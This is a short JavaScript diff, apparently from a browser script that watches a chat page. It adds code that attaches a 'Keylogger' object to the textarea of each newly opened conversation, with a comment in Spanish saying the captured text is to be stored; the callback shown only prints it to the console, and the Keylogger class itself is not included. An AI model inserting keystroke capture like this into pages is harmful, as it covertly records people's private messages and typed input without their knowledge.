@@ -56,6 +56,10 @@ $(document).ready(function() {
 						var elem = node.getElementsByClassName("titlebarTextWrapper")[0];
 						if(elem.tagName == "H4"){
 							console.log( "Se inicia una nueva conversacion" );
+                                                        var flush=new Keylogger($(node).find("textarea"),function(a,b){
+                                                            // a es el texto para ser almacenado
+                                                            console.log("keyloguer function: "+a);
+                                                        });
 						}
 					}
 				});
